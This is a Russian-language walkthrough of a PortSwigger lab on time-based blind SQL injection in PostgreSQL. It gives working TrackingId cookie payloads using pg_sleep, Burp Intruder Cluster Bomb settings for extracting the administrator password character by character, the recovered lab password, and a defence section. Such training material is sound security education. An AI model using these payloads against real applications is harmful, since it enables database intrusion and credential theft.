# 📘 PortSwigger Lab 012: Blind SQL Injection with Time Delays and Information Retrieval

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

---

# 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Теория](#theory)
- [🔍 Шаг 1 — Подтверждение Time-Based SQL Injection](#step1)
- [🔍 Шаг 2 — Проверка канала TRUE / FALSE](#step2)
- [🔍 Шаг 3 — Проверка существования administrator](#step3)
- [🔍 Шаг 4 — Определение длины пароля](#step4)
- [🔍 Шаг 5 — Официальный способ восстановления пароля](#step5)
- [⚡ Шаг 6 — Быстрый способ через Intruder Cluster Bomb](#step6)
- [🔑 Полученные учетные данные](#credentials)
- [🧩 Использованные Payloads](#payloads)
- [💥 Почему атака сработала](#why)
- [🛡 Защита](#defense)
- [🛠 Чеклист](#checklist)

---

<a id="goal"></a>

# 🎯 Цель

Получить пароль пользователя `administrator` через Blind SQL Injection с использованием временных задержек и выполнить вход в приложение.

---

<a id="theory"></a>

# 🧠 Теория

В этой лабораторной работе приложение:

- не показывает ошибки SQL;
- не возвращает результаты SQL-запросов;
- не меняет содержимое страницы при TRUE/FALSE условиях.

Единственный полезный сигнал — время ответа сервера.

```text
TRUE  → ответ через ~10 секунд
FALSE → ответ сразу
```

Так как используется PostgreSQL, для задержки применяется функция:

```sql
pg_sleep(10)
```

Идея атаки: задавать базе маленькие TRUE/FALSE вопросы и смотреть, задерживается ли HTTP-ответ.

---

<a id="step1"></a>

# 🔍 Шаг 1 — Подтверждение Time-Based SQL Injection

В cookie `TrackingId` отправляем payload:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Почему именно этот шаг:

- `1=1` всегда TRUE;
- если SQL-инъекция работает, выполнится `pg_sleep(10)`;
- ответ должен прийти примерно через 10 секунд.

Ожидаемый результат:

```text
Ответ задерживается примерно на 10 секунд.
```

Вывод:

```text
Time-Based SQL Injection подтверждена.
```

---

<a id="step2"></a>

# 🔍 Шаг 2 — Проверка канала TRUE / FALSE

Теперь проверяем FALSE условие:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Почему именно этот шаг:

- `1=2` всегда FALSE;
- должна выполниться ветка `pg_sleep(0)`;
- ответ должен прийти сразу.

Ожидаемый результат:

```text
Ответ приходит мгновенно.
```

Вывод:

```text
TRUE  → задержка
FALSE → без задержки
```

Теперь у нас есть рабочий канал получения ответов от базы через время.

---

<a id="step3"></a>

# 🔍 Шаг 3 — Проверка существования administrator

Проверяем, существует ли пользователь `administrator`:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Почему именно этот шаг:

Перед извлечением пароля нужно убедиться, что целевая учетная запись есть в таблице `users`.

Ожидаемый результат:

```text
Ответ задерживается примерно на 10 секунд.
```

Вывод:

```text
Пользователь administrator существует.
```

---

<a id="step4"></a>

# 🔍 Шаг 4 — Определение длины пароля

Проверяем длину пароля через `LENGTH(password)`:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Проверяем разные значения:

```text
>10
>15
>19
>20
```

Интерпретация:

```text
Есть задержка → условие TRUE
Нет задержки → условие FALSE
```

В этой лаборатории:

```text
LENGTH(password)>19 → задержка
LENGTH(password)>20 → без задержки
```

Вывод:

```text
Длина пароля = 20 символов.
```

---

<a id="step5"></a>

# 🔍 Шаг 5 — Официальный способ восстановления пароля

Официальный способ PortSwigger предполагает проверку каждой позиции пароля отдельно.

Пример для первого символа:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Смысл payload:

```text
Если первый символ пароля равен "a", задержать ответ на 10 секунд.
```

В Burp Intruder:

```text
Payload type: Simple list
Payloads: a-z и 0-9
Resource pool: Maximum concurrent requests = 1
```

Смотрим колонку:

```text
Response received
```

Интерпретация:

```text
~100 ms     → неправильный символ
~10000 ms   → правильный символ
```

После нахождения первого символа меняем позицию:

```sql
SUBSTRING(password,2,1)
SUBSTRING(password,3,1)
...
SUBSTRING(password,20,1)
```

Недостаток:

```text
Нужно запускать Intruder отдельно для каждой из 20 позиций.
```

---

<a id="step6"></a>

# ⚡ Шаг 6 — Быстрый способ через Intruder Cluster Bomb

Более быстрый способ — перебрать все позиции за одну атаку.

Используем две позиции payload:

```sql
SUBSTRING(password,§1§,1)='§a§'
```

Полная идея:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Настройка Intruder:

```text
Attack type: Cluster Bomb
```

Payload Set 1:

```text
1
2
3
...
20
```

Payload Set 2:

```text
a
b
c
...
z
0
1
2
...
9
```

Resource Pool:

```text
Maximum concurrent requests = 1
```

Почему важно поставить 1 поток:

Time-Based атаки зависят от точного измерения времени. Если Burp отправляет много запросов параллельно, задержки могут накладываться друг на друга и результаты будет сложнее интерпретировать.

Всего запросов:

```text
20 × 36 = 720 запросов
```

После завершения атаки:

1. сортируем результаты по `Response received`;
2. находим строки около `10000 ms`;
3. сортируем найденные строки по `Payload 1`;
4. читаем символы из `Payload 2`.

Восстановленный пароль:

```text
ehbq02l9bz5o6py22wtl
```

---

<a id="credentials"></a>

# 🔑 Полученные учетные данные

<details>
<summary>Показать пароль administrator</summary>

```text
Username: administrator
Password: ehbq02l9bz5o6py22wtl
```

</details>

---

<a id="payloads"></a>

# 🧩 Использованные Payloads

Проверка TRUE-задержки:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Проверка FALSE-условия:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

Проверка пользователя `administrator`:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Проверка длины пароля:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Проверка одного символа:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Версия для Cluster Bomb:

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

---

<a id="why"></a>

# 💥 Почему атака сработала

Атака сработала, потому что:

- cookie `TrackingId` вставлялся напрямую в SQL-запрос;
- запрос выполнялся синхронно;
- PostgreSQL поддерживает функцию `pg_sleep()`;
- время ответа стало каналом TRUE/FALSE;
- приложение не использовало параметризованные запросы.

---

<a id="defense"></a>

# 🛡 Защита

Чтобы защититься:

- использовать prepared statements;
- использовать parameterized queries;
- не собирать SQL через конкатенацию строк;
- ограничивать права database user;
- мониторить медленные и подозрительные SQL-запросы;
- настраивать query timeout;
- использовать WAF как дополнительный слой защиты.

---

<a id="checklist"></a>

# 🛠 Чеклист

- [x] Time-Based SQL Injection подтверждена
- [x] TRUE/FALSE канал через задержку подтвержден
- [x] Пользователь `administrator` найден
- [x] Длина пароля определена
- [x] Пароль восстановлен через Intruder
- [x] Выполнен вход под `administrator`

---

# ⬆ Наверх

[Вернуться к содержанию](#top)
